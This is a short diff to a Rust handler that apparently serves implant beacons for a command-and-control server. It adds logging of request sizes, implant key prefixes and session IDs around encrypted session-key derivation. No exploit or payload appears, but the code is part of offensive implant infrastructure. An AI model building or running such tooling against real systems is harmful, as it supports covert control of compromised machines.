@@ -405,7 +405,10 @@ async fn checkin_handler(
 /// The response is encrypted with the same session key and returned in the
 /// same wire format.
 async fn beacon_handler(State(state): State<HttpState>, body: Bytes) -> impl IntoResponse {
+    tracing::info!("beacon_handler: received {} bytes", body.len());
+
     if body.len() < BEACON_MIN_SIZE {
+        tracing::warn!("beacon_handler: body too small ({} < {})", body.len(), BEACON_MIN_SIZE);
         return StatusCode::BAD_REQUEST.into_response();
     }
 
@@ -426,9 +429,18 @@ async fn beacon_handler(State(state): State<HttpState>, body: Bytes) -> impl Int
     // Reconstruct the full implant public key by looking up session by prefix.
     // For the first check-in, we accept the full 32-byte key from the ciphertext header
     // and register a new session.
+    tracing::info!("beacon_handler: looking up session for prefix {:02x}{:02x}{:02x}{:02x}...",
+        implant_id_prefix[0], implant_id_prefix[1], implant_id_prefix[2], implant_id_prefix[3]);
+
     let (session_key, session_id, implant_pubkey) = match derive_session_key(&state, implant_id_prefix).await {
-        Ok(result) => result,
-        Err(_) => return StatusCode::UNAUTHORIZED.into_response(),
+        Ok(result) => {
+            tracing::info!("beacon_handler: session key derived, session_id={:?}", result.1);
+            result
+        },
+        Err(_) => {
+            tracing::warn!("beacon_handler: failed to derive session key");
+            return StatusCode::UNAUTHORIZED.into_response();
+        },
     };
 
     // Build AEAD ciphertext with appended tag (as chacha20poly1305 crate expects)
